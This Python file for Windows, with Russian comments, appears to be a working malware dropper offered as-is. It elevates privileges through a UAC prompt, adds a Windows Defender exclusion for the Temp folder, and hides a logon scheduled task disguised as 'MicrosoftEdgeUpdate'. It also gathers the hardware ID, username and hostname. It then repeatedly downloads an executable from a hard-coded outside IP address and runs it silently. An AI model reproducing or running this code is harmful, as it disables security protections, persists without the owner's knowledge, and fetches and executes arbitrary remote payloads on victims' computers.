import websocket
import json
import os
import random
import uuid
import base64
import time
import requests
import platform
import subprocess
import socket
import ctypes
import sys
from pathlib import Path
import threading

CONFIG_URL = "http://212.80.7.213:20578"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        except:
            return False
    return True

def add_defender_exclusion():
    try:
        temp_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp')
        ps_command = f'Add-MpPreference -ExclusionPath "{temp_path}"'
        subprocess.run(
            ['powershell', '-Command', ps_command],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True
    except:
        return False

def add_to_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        task_name = "MicrosoftEdgeUpdate"
        
        xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>{exe_path}</Command>
    </Exec>
  </Actions>
</Task>'''
        
        xml_path = os.path.join(os.getenv('TEMP'), 'task_tmp.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_content)
        
        subprocess.run(
            ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        try:
            os.remove(xml_path)
        except:
            pass
        
        return True
    except:
        return False

def setup_persistence():
    marker_path = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemCache', '.configured')
    
    if os.path.exists(marker_path):
        return True  
    
    if not is_admin():
        request_admin()
        return False
    
    add_defender_exclusion()
    add_to_startup()
    
    try:
        os.makedirs(os.path.dirname(marker_path), exist_ok=True)
        with open(marker_path, 'w') as f:
            f.write('1')
    except:
        pass
    
    return True

def get_temp_folder():
    temp_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp')
    folder_name = f"output{random.randint(100, 999)}"
    output_path = os.path.join(temp_dir, folder_name)
    if not os.path.exists(output_path):
        os.makedirs(output_path)
    return output_path

def get_config_path():
    base_dir = os.getenv('LOCALAPPDATA')
    config_dir = os.path.join(base_dir, 'SystemCache')
    if not os.path.exists(config_dir):
        os.makedirs(config_dir)
    return os.path.join(config_dir, 'sys_id.dat')

def load_or_create_id():
    config_path = get_config_path()
    
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r') as f:
                existing_id = f.read().strip()
                if len(existing_id) > 10:
                    return existing_id
        except:
            pass
    
    new_id = str(uuid.uuid4())
    try:
        with open(config_path, 'w') as f:
            f.write(new_id)
        
        if platform.system() == "Windows":
            subprocess.run(['attrib', '+h', config_path], shell=True, 
                           creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    
    return new_id

def get_system_info():
    info = {
        'hwid': str(uuid.getnode()),
        'username': os.getlogin(),
        'os': f"{platform.system()} {platform.release()}",
        'pc_name': socket.gethostname()
    }
    if platform.system() == "Windows":
        try:
            cmd = subprocess.check_output('wmic csproduct get uuid', shell=True,
                                        creationflags=subprocess.CREATE_NO_WINDOW)
            decoded = str(cmd).split('\\r\\n')[1].strip()
            if decoded: 
                info['hwid'] = decoded
        except:
            pass
    return info

def download_and_execute():
    output_folder = get_temp_folder()
    client_id = load_or_create_id()
    sys_info = get_system_info()
    
    while True:
        try:
            print("Скачиваем программу...")
            response = requests.get(CONFIG_URL, timeout=30)
            if response.status_code == 200:
                build_name = f"program_{client_id[:8]}.exe"
                file_path = os.path.join(output_folder, build_name)
                
                with open(file_path, 'wb') as f:
                    f.write(response.content)
                
                print("Запускаем программу...")
                subprocess.Popen([file_path], creationflags=subprocess.CREATE_NO_WINDOW)
                
                # Программа успешно запущена - выходим из цикла
                print("Программа запущена!")
                return True
                
        except Exception as e:
            print(f"Ошибка: {e}")
        
        # Ждём 5 секунд перед повтором
        time.sleep(5)

def initializationSelf():
    if not setup_persistence():
        sys.exit(0)
    
    # Блокируем закрытие до успешного скачивания и запуска
    download_and_execute()

if __name__ == "__main__":
    initializationSelf()
